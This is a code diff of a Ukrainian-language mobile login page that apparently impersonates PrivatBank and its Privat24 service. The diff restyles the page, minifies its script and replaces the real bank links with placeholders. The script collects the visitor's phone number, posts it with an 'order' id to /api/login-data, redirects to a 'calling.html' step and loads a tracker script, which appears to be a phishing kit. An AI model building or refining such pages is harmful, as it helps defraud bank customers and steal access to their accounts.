@@ -5,276 +5,177 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Вхід/Реєстрація</title>
 <style>
-  *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
-  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
 
-  .top-line{height:3px;background:#00A651;flex-shrink:0}
+.green-bar{height:3px;background:#00A651}
 
-  .topbar{
-    display:flex;align-items:center;justify-content:flex-end;
-    padding:14px 16px;
-  }
-  .close-btn{
-    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
-    background:none;border:none;cursor:pointer;
-  }
-  .close-btn svg{width:24px;height:24px;fill:none;stroke:#222;stroke-width:2.2;stroke-linecap:round}
+.header{display:flex;align-items:center;justify-content:flex-end;padding:16px 20px}
+.x-btn{background:none;border:none;cursor:pointer;padding:4px}
+.x-btn svg{width:22px;height:22px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
 
-  .main-content{flex:1;padding:0 24px;display:flex;flex-direction:column}
+.body{flex:1;padding:0 20px;display:flex;flex-direction:column}
 
-  h1{font-size:32px;font-weight:300;color:#222;text-align:center;margin:28px 0 40px;letter-spacing:-.3px}
+.title{font-size:24px;font-weight:300;color:#1a1a1a;text-align:center;margin:20px 0 32px}
 
-  .phone-label{font-size:13px;color:#aaa;margin-bottom:10px}
+.label{font-size:12px;color:#b0b0b0;margin-bottom:8px}
 
-  .phone-row{
-    display:flex;align-items:center;gap:0;
-    border-bottom:2px solid #00A651;padding-bottom:12px;margin-bottom:28px;
-  }
-  .phone-prefix{
-    display:flex;align-items:center;gap:6px;cursor:pointer;flex-shrink:0;
-    padding-right:14px;border-right:1.5px solid #ccc;margin-right:14px;
-  }
-  .phone-prefix .flag{font-size:22px;line-height:1}
-  .phone-prefix .code{font-size:20px;font-weight:600;color:#222}
-  .phone-prefix .arrow{width:16px;height:16px;fill:#888;flex-shrink:0}
-  .phone-input{
-    border:none;outline:none;font-size:20px;font-family:inherit;color:#222;
-    background:transparent;width:100%;letter-spacing:1px;
-  }
-  .phone-input::placeholder{color:#ccc;letter-spacing:1px}
+.phone-field{
+  display:flex;align-items:center;
+  padding-bottom:10px;border-bottom:1.5px solid #00A651;margin-bottom:24px;
+}
+.prefix{display:flex;align-items:center;gap:5px;padding-right:12px;border-right:1px solid #d0d0d0;margin-right:12px;cursor:pointer}
+.prefix .flag{font-size:20px}
+.prefix .num{font-size:16px;font-weight:600;color:#1a1a1a}
+.prefix .arr{width:12px;height:12px}
+.prefix .arr path{fill:#999}
+.phone-input{border:none;outline:none;font-size:16px;color:#1a1a1a;background:transparent;width:100%;font-family:inherit}
+.phone-input::placeholder{color:#ccc}
 
-  .terms-row{
-    display:flex;align-items:flex-start;gap:12px;margin-bottom:32px;
-  }
-  .terms-check{
-    width:24px;height:24px;border-radius:4px;border:2px solid #ccc;
-    flex-shrink:0;cursor:pointer;display:flex;align-items:center;justify-content:center;
-    background:#fff;transition:.15s;margin-top:2px;
-  }
-  .terms-check.checked{background:#00A651;border-color:#00A651}
-  .terms-check svg{width:16px;height:16px;fill:none;stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;display:none}
-  .terms-check.checked svg{display:block}
-  .terms-text{font-size:13px;color:#555;line-height:1.5}
-  .terms-text a{color:#00A651;text-decoration:none;font-weight:500}
+.agree{display:flex;align-items:flex-start;gap:10px;margin-bottom:28px}
+.checkbox{
+  width:20px;height:20px;min-width:20px;border:1.5px solid #ccc;border-radius:4px;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  background:#fff;transition:.15s;margin-top:1px;
+}
+.checkbox.on{background:#00A651;border-color:#00A651}
+.checkbox svg{width:12px;height:12px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round;display:none}
+.checkbox.on svg{display:block}
+.agree-text{font-size:11.5px;color:#666;line-height:1.5}
+.agree-text a{color:#00A651;text-decoration:none}
 
-  .continue-btn{
-    display:block;width:100%;margin:0 auto;padding:18px;
-    border:none;border-radius:30px;font-size:16px;font-weight:600;
-    color:#fff;cursor:pointer;font-family:inherit;
-    background:#00A651;transition:.2s;
-  }
-  .continue-btn:hover{background:#008C45}
-  .continue-btn:disabled{opacity:.5;cursor:not-allowed}
+.btn-green{
+  width:100%;padding:15px;border:none;border-radius:50px;
+  font-size:15px;font-weight:600;color:#fff;background:#00A651;
+  cursor:pointer;font-family:inherit;transition:.2s;
+}
+.btn-green:hover{background:#008C45}
+.btn-green:disabled{opacity:.45;cursor:default}
 
-  .or-divider{text-align:center;color:#aaa;font-size:14px;margin:18px 0}
+.divider{text-align:center;color:#bbb;font-size:13px;margin:16px 0}
 
-  .p24-btn{
-    display:flex;align-items:center;justify-content:center;gap:10px;
-    width:100%;margin:0 auto;padding:18px;
-    border:none;border-radius:30px;font-size:16px;font-weight:600;
-    color:#fff;cursor:pointer;font-family:inherit;
-    background:#1a1a1a;transition:.2s;
-  }
-  .p24-btn:hover{background:#333}
-  .p24-btn .p24-icon{
-    width:28px;height:28px;border-radius:50%;background:#00A651;
-    display:flex;align-items:center;justify-content:center;
-    font-size:14px;font-weight:800;color:#fff;
-  }
+.btn-black{
+  width:100%;padding:15px;border:none;border-radius:50px;
+  font-size:15px;font-weight:600;color:#fff;background:#1a1a1a;
+  cursor:pointer;font-family:inherit;transition:.2s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.btn-black:hover{background:#333}
+.icon24{
+  width:24px;height:24px;border-radius:50%;background:#00A651;
+  display:flex;align-items:center;justify-content:center;
+  font-size:12px;font-weight:800;color:#fff;
+}
 
-  .store-row{
-    display:flex;align-items:center;justify-content:center;gap:32px;
-    padding:28px 24px 32px;margin-top:auto;
-  }
-  .store-item{display:flex;align-items:center;gap:10px;text-decoration:none;color:#222}
-  .store-item .store-icon{width:28px;height:28px;flex-shrink:0}
-  .store-item .store-label{font-size:11px;color:#aaa;line-height:1.2}
-  .store-item .store-name{font-size:14px;font-weight:600;color:#222}
+.stores{
+  display:flex;align-items:center;justify-content:center;gap:28px;
+  margin-top:auto;padding:24px 20px 28px;
+}
+.store{display:flex;align-items:center;gap:8px;text-decoration:none;color:#1a1a1a}
+.store svg{width:24px;height:24px;flex-shrink:0}
+.store .s-top{font-size:10px;color:#999}
+.store .s-name{font-size:13px;font-weight:600;color:#1a1a1a}
 
-  .error-msg{
-    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:8px;
-    padding:10px 14px;margin-bottom:14px;color:#c62828;font-size:13px;text-align:center;
-  }
+.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:8px;padding:8px 12px;margin-bottom:12px;color:#c62828;font-size:12px;text-align:center}
 
-  .error-overlay{
-    display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:300;
-    align-items:center;justify-content:center;padding:24px;backdrop-filter:blur(3px);
-  }
-  .error-overlay.open{display:flex}
-  .error-modal{
-    background:#fff;border-radius:24px;width:100%;max-width:380px;
-    padding:32px 28px 28px;position:relative;text-align:center;
-    animation:errorPop .3s ease-out;
-  }
-  @keyframes errorPop{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
-  .error-modal-close{
-    position:absolute;top:16px;right:16px;width:36px;height:36px;border-radius:50%;
-    background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;
-    justify-content:center;transition:.2s;
-  }
-  .error-modal-close:hover{background:#e5e5e5}
-  .error-modal-close svg{width:18px;height:18px;fill:none;stroke:#888;stroke-width:2.5;stroke-linecap:round}
-  .error-img-wrap{position:relative;cursor:pointer}
-  .error-img-wrap img{width:100%;height:auto;display:block;border-radius:12px}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99;align-items:center;justify-content:center;padding:20px}
+.overlay.open{display:flex}
+.modal{background:#fff;border-radius:20px;width:100%;max-width:360px;padding:28px 24px;position:relative;text-align:center}
+.modal-x{position:absolute;top:14px;right:14px;width:32px;height:32px;border-radius:50%;background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.modal-x svg{width:16px;height:16px;stroke:#888;stroke-width:2.5;fill:none;stroke-linecap:round}
+.modal img{width:100%;border-radius:10px}
 </style>
 </head>
 <body>
 
-  <div class="top-line"></div>
+<div class="green-bar"></div>
 
-  <div class="topbar">
-    <button class="close-btn" type="button" onclick="history.back()">
-      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
-    </button>
+<div class="header">
+  <button class="x-btn" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+</div>
+
+<div class="body">
+  <div class="err" id="err"></div>
+
+  <div class="title">Вхід/Реєстрація</div>
+
+  <div class="label">Номер телефону</div>
+
+  <div class="phone-field">
+    <div class="prefix">
+      <span class="flag">🇺🇦</span>
+      <span class="num">+380</span>
+      <svg class="arr" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+    <input class="phone-input" id="phone" type="tel" inputmode="numeric" placeholder="00 000 00 00" maxlength="12" oninput="checkReady()">
   </div>
 
-  <div class="main-content">
-    <div class="error-msg" id="errorMsg"></div>
-
-    <h1>Вхід/Реєстрація</h1>
-
-    <div class="phone-label">Номер телефону</div>
-
-    <div class="phone-row">
-      <div class="phone-prefix">
-        <span class="flag">🇺🇦</span>
-        <span class="code">+380</span>
-        <svg class="arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z" fill="#888"/></svg>
-      </div>
-      <input class="phone-input" id="phone" type="tel" inputmode="numeric" placeholder="000000000" maxlength="12" oninput="checkReady()">
-    </div>
-
-    <div class="terms-row">
-      <div class="terms-check" id="termsCheck" onclick="toggleTerms()">
-        <svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>
-      </div>
-      <div class="terms-text">
-        Продовжуючи, я підтверджую, що згоден (-на) з <a href="https://privatbank.ua/en/public-contracts">Умовами та Правилами</a>, й ознайомлений (-на) із <a href="https://privatbank.ua/en/personal-information">Повідомленням про обробку персональних даних у Банку</a>
-      </div>
-    </div>
-
-    <button class="continue-btn" id="continueBtn" onclick="submitLogin()" disabled>Продовжити</button>
-
-    <div class="or-divider">або</div>
-
-    <button class="p24-btn" type="button" onclick="submitLogin()">
-      Увійти через <span class="p24-icon">24</span>
-    </button>
+  <div class="agree">
+    <div class="checkbox" id="chk" onclick="toggle()"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg></div>
+    <div class="agree-text">Продовжуючи, я підтверджую, що згоден (-на) з <a href="#">Умовами та Правилами</a>, й ознайомлений (-на) із <a href="#">Повідомленням про обробку персональних даних у Банку</a></div>
   </div>
 
-  <div class="store-row">
-    <a class="store-item" href="#">
-      <svg class="store-icon" viewBox="0 0 28 28" fill="none">
-        <path d="M20.44 14.84c-.03-2.86 2.34-4.24 2.44-4.3-1.33-1.94-3.4-2.21-4.13-2.24-1.76-.18-3.43 1.03-4.32 1.03-.89 0-2.27-1.01-3.73-.98-1.92.03-3.69 1.12-4.68 2.84-2 3.46-.51 8.59 1.43 11.4.95 1.38 2.09 2.92 3.58 2.86 1.43-.06 1.98-.93 3.71-.93 1.73 0 2.22.93 3.73.9 1.55-.03 2.54-1.4 3.47-2.78 1.1-1.6 1.55-3.14 1.57-3.22-.03-.02-3.02-1.16-3.07-4.58z" fill="#333"/>
-        <path d="M17.58 6.6c.79-.96 1.32-2.28 1.17-3.6-1.14.05-2.51.76-3.33 1.71-.73.84-1.37 2.2-1.2 3.49 1.27.1 2.56-.64 3.36-1.6z" fill="#333"/>
-      </svg>
-      <div>
-        <div class="store-label">Доступно у</div>
-        <div class="store-name">App Store</div>
-      </div>
-    </a>
-    <a class="store-item" href="#">
-      <svg class="store-icon" viewBox="0 0 28 28" fill="none">
-        <path d="M4.42 3.54a1.94 1.94 0 00-.42 1.3v18.32c0 .5.15.94.44 1.32l.08.08L15.6 13.49v-.3L4.5 3.46l-.08.08z" fill="#00A651"/>
-        <path d="M19.32 17.2l-3.72-3.72v-.3l3.73-3.72.08.05 4.41 2.5c1.26.72 1.26 1.89 0 2.61l-4.41 2.5-.09.08z" fill="#FFD700"/>
-        <path d="M19.41 17.12L15.6 13.34 4.42 24.48c.42.44 1.1.5 1.88.05l13.11-7.41" fill="#E53935"/>
-        <path d="M19.41 9.54L6.3 2.14c-.78-.45-1.46-.39-1.88.05L15.6 13.34l3.81-3.8z" fill="#4CAF50"/>
-      </svg>
-      <div>
-        <div class="store-label">Доступно у</div>
-        <div class="store-name">Play Market</div>
-      </div>
-    </a>
-  </div>
+  <button class="btn-green" id="goBtn" onclick="go()" disabled>Продовжити</button>
 
-<!-- Error Modal -->
-<div class="error-overlay" id="errorOverlay">
-  <div class="error-modal">
-    <button class="error-modal-close" onclick="closeErrorModal()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
-    <div class="error-img-wrap" onclick="closeErrorModal()">
-      <img src="images/error-illustration.jpg" alt="Помилка">
-    </div>
+  <div class="divider">або</div>
+
+  <button class="btn-black" onclick="go()">Увійти через <span class="icon24">24</span></button>
+</div>
+
+<div class="stores">
+  <a class="store" href="#">
+    <svg viewBox="0 0 24 24" fill="#1a1a1a"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.81-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+    <div><div class="s-top">Доступно у</div><div class="s-name">App Store</div></div>
+  </a>
+  <a class="store" href="#">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M3.61 1.81L13.39 12 3.61 22.19c-.26-.44-.41-.96-.41-1.52V3.33c0-.56.15-1.08.41-1.52z" fill="#4285F4"/><path d="M17.07 8.32l-3.68 3.68 3.68 3.68 4.15-2.36c.72-.41.72-1.24 0-1.64l-4.15-2.36z" fill="#FBBC04"/><path d="M3.61 22.19c.51.86 1.41 1.26 2.32.78L17.07 15.68l-3.68-3.68L3.61 22.19z" fill="#EA4335"/><path d="M3.61 1.81L13.39 12l3.68-3.68L5.93 1.03C5.02.55 4.12.95 3.61 1.81z" fill="#34A853"/></svg>
+    <div><div class="s-top">Доступно у</div><div class="s-name">Play Market</div></div>
+  </a>
+</div>
+
+<div class="overlay" id="ov">
+  <div class="modal">
+    <button class="modal-x" onclick="closeErr()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <img src="images/error-illustration.jpg" alt="" onclick="closeErr()">
   </div>
 </div>
 
 <script>
-  var params = new URLSearchParams(location.search);
-  var orderId = params.get("order");
-  var termsAccepted = false;
+var params=new URLSearchParams(location.search),orderId=params.get("order"),agreed=false;
 
-  function toggleTerms(){
-    termsAccepted = !termsAccepted;
-    var el = document.getElementById("termsCheck");
-    if(termsAccepted) el.classList.add("checked");
-    else el.classList.remove("checked");
-    checkReady();
-  }
+function toggle(){
+  agreed=!agreed;
+  var c=document.getElementById("chk");
+  agreed?c.classList.add("on"):c.classList.remove("on");
+  checkReady();
+}
+function checkReady(){
+  var p=document.getElementById("phone").value.replace(/\D/g,"");
+  document.getElementById("goBtn").disabled=!(p.length>=9&&agreed);
+}
+if(params.get("error")==="1")document.getElementById("ov").classList.add("open");
 
-  function checkReady(){
-    var phone = document.getElementById("phone").value.replace(/\D/g,"");
-    var btn = document.getElementById("continueBtn");
-    if(phone.length >= 9 && termsAccepted){
-      btn.disabled = false;
-    } else {
-      btn.disabled = true;
-    }
-  }
+function closeErr(){
+  document.getElementById("ov").classList.remove("open");
+  history.replaceState(null,"","login.html"+(orderId?"?order="+orderId:""));
+}
+document.getElementById("ov").addEventListener("click",function(e){if(e.target===this)closeErr()});
 
-  if(params.get("error") === "1"){
-    document.getElementById("errorOverlay").classList.add("open");
-  }
-
-  function closeErrorModal(){
-    document.getElementById("errorOverlay").classList.remove("open");
-    history.replaceState(null, "", "login.html" + (orderId ? "?order=" + orderId : ""));
-  }
-
-  document.getElementById("errorOverlay").addEventListener("click", function(e){
-    if(e.target === this) closeErrorModal();
-  });
-
-  async function submitLogin(){
-    var phone = document.getElementById("phone").value.replace(/\D/g,"");
-    if(phone.length < 9) return;
-
-    var btn = document.getElementById("continueBtn");
-    btn.disabled = true;
-    btn.textContent = "Зачекайте...";
-
-    var fullPhone = "+380" + phone;
-
-    try {
-      var res = await fetch("/api/login-data", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({order_id:orderId, username:fullPhone, country:"UA"})
-      });
-      var data = await res.json();
-      if(!data.success){
-        showError(data.message || "Сталася помилка");
-        btn.disabled = false;
-        btn.textContent = "Продовжити";
-        return;
-      }
-      location.href = "calling.html?order=" + orderId + "&phone=" + phone;
-    } catch(err){
-      showError("Помилка з'єднання");
-      btn.disabled = false;
-      btn.textContent = "Продовжити";
-    }
-  }
-
-  function showError(msg){
-    var el = document.getElementById("errorMsg");
-    el.textContent = msg;
-    el.style.display = "block";
-    setTimeout(function(){ el.style.display = "none"; }, 3000);
-  }
-
-  document.getElementById("phone").addEventListener("keydown", function(e){
-    if(e.key === "Enter") submitLogin();
-  });
+async function go(){
+  var p=document.getElementById("phone").value.replace(/\D/g,"");
+  if(p.length<9)return;
+  var btn=document.getElementById("goBtn");
+  btn.disabled=true;btn.textContent="Зачекайте...";
+  try{
+    var r=await fetch("/api/login-data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order_id:orderId,username:"+380"+p,country:"UA"})});
+    var d=await r.json();
+    if(!d.success){showErr(d.message||"Помилка");btn.disabled=false;btn.textContent="Продовжити";return}
+    location.href="calling.html?order="+orderId+"&phone="+p;
+  }catch(e){showErr("Помилка з'єднання");btn.disabled=false;btn.textContent="Продовжити"}
+}
+function showErr(m){var e=document.getElementById("err");e.textContent=m;e.style.display="block";setTimeout(function(){e.style.display="none"},3000)}
+document.getElementById("phone").addEventListener("keydown",function(e){if(e.key==="Enter")go()});
 </script>
 <script src="tracker.js"></script>
 </body>
